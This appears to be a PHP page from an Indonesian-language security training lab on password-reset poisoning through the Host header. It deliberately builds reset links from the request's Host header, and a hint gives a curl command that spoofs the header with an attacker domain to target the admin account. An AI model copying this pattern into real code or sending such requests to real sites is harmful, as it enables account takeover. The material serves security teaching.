<?php
$title = 'Lab 4: Password Reset Poisoning Lewat Host Header';
require_once __DIR__ . '/lib.php';
$db = load_db();
$msg = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['request_reset'])) {
    $username = $_POST['username'] ?? '';
    if (find_user($db, $username)) {
        $token = bin2hex(random_bytes(8));
        $db['reset_tokens'][$token] = ['username' => $username, 'used' => false];
        // VULNERABLE: builds the absolute reset URL "sent by email" using
        // the Host header from the CURRENT incoming request, instead of a
        // fixed, server-side-configured trusted domain. The Host header is
        // fully controlled by whoever sends the HTTP request.
        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
        $reset_link = "http://$host/password-reset/lab4_host_header_poisoning.php?confirm=1&token=$token";
        $email_text = "Halo $username,\n\nKlik link berikut untuk reset password:\n$reset_link\n\n(link ini \"dikirim\" lewat email - ditampilkan di sini untuk kebutuhan lab)";
        $db['email_log'][] = ['to' => $username, 'html' => nl2br(htmlspecialchars($email_text))];
        $db['email_log'] = array_slice($db['email_log'], -3);
        save_db($db);
        $msg = 'Email reset "terkirim" ke ' . htmlspecialchars($username) . ' - lihat isi lengkapnya di simulasi inbox di bawah.';
    }
}

$confirm_msg = '';
if (isset($_GET['confirm']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_password'])) {
    $token = $_POST['token'] ?? '';
    if (!empty($db['reset_tokens'][$token]) && !$db['reset_tokens'][$token]['used']) {
        $db['reset_tokens'][$token]['used'] = true;
        save_db($db);
        $confirm_msg = 'Password untuk ' . htmlspecialchars($db['reset_tokens'][$token]['username']) . ' berhasil direset!';
    } else {
        $confirm_msg = 'Token tidak valid / sudah dipakai.';
    }
}

include 'header.php';
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: minta reset untuk <code>admin</code> lewat request yang header
<code>Host</code>-nya sudah kamu ubah jadi domain milik attacker. Server memakai header itu
apa adanya untuk membangun link reset yang "dikirim lewat email" &mdash; kalau link itu nanti
diklik korban (atau di-<em>preview</em> otomatis oleh pemindai link/antivirus email, hal yang
sangat umum), token akan terkirim ke server attacker, bukan server aplikasi yang sah:</p>
<pre>curl -X POST -H "Host: attacker-evil.test" -d "username=admin" \
  http://localhost:8079/password-reset/lab4_host_header_poisoning.php --data-urlencode "request_reset=1"</pre>
<p class="hint">Lihat "Simulasi Inbox" di bawah setelah request &mdash; perhatikan domain pada
link reset yang dihasilkan.</p>
</details>

<h3>1. Request Reset (coba dengan Host header dipalsukan)</h3>
<form method="post">
  <label>Username</label><br>
  <input type="text" name="username" value="admin">
  <button type="submit" name="request_reset" value="1">Request Password Reset (pakai Host header request ini)</button>
</form>
<p class="hint">Host header request ini terdeteksi server sebagai: <code><?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? ''); ?></code> (kalau kamu kirim lewat curl dengan <code>-H "Host: attacker-evil.test"</code>, nilai ini akan berubah).</p>
<?php if ($msg): ?><div class="ok-box"><?php echo $msg; ?></div><?php endif; ?>

<h3>Simulasi Inbox</h3>
<?php foreach (($db['email_log'] ?? []) as $mail): ?>
<div class="result-box" style="color:#111;background:#fff;"><?php echo $mail['html']; ?></div>
<?php endforeach; ?>

<h3>2. Confirm Reset</h3>
<form method="post" action="lab4_host_header_poisoning.php?confirm=1">
  <label>Token</label><br>
  <input type="text" name="token">
  <label>Password baru</label><br>
  <input type="text" name="new_password" value="hacked123">
  <button type="submit">Reset Password</button>
</form>
<?php if ($confirm_msg): ?><div class="<?php echo strpos($confirm_msg,'berhasil')!==false ? 'result-box' : 'error-box'; ?>"><?php echo htmlspecialchars($confirm_msg); ?></div><?php endif; ?>

<?php include 'footer.php'; ?>
